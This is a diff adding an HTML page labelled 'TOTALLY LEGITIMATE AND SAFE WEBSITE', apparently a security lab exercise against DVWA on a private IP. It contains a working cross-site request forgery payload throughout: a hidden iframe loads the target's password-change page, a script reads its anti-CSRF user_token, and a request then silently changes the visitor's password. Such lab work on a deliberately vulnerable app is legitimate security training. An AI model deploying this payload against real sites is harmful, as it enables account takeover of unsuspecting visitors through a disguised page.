@@ -1,0 +1,19 @@
+<html>
+ <body>
+  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
+  <iframe id="myFrame" src="192.168.66.2/DVWA/vulnerabilities/csrf/?password_new=csf2024s1&password_conf=csf2024s1&" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
+  <script>
+   function maliciousPayload() {
+    console.log("start");
+    var iframe = document.getElementById("myFrame");
+    var doc = iframe.contentDocument  || iframe.contentWindow.document;
+    var token = doc.getElementsByName("user_token")[0].value;
+    const http = new XMLHttpRequest();
+    const url = "192.168.66.2/DVWA/vulnerabilities/csrf/?password_new=csf2024s1&password_conf=csf2024s1&&Change=Change&user_token="+token+"#";
+    http.open("GET", url);
+    http.send();
+    console.log("password changed");
+   }
+  </script>
+ </body>
+</html>
